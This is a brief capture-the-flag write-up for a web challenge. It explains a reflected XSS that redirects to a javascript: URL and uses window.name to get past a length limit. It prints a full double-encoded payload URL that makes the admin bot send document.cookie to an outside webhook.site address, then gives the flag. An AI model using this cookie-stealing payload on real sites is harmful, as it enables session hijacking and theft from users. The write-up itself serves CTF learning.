Redirect to javascript:pseudo protocol to get JS execution. Reference name using javascript:name to get pass length limit.

Make sure to double encode so it's in the expected format when it's visited by the bot.
```
http://chal.78727867.xyz:21337/visit?nonce=34164185&url=http://localhost:5000/%3Fname%3D%253Cscript%253Ewindow%2Elocation%253d%2527https%3A%2F%2Fwebhook%2Esite%2F2f2c1a84%2Db005%2D4ff3%2Dadc5%2D19855441af36%2F%2527%252bdocument%2Ecookie%253C%2Fscript%253E%26url%3Djavascript%3Aname%0A%0A
```

NHNC{javascript:xssed!&xssed!=alert(/whale/)}

Solved by: benkyou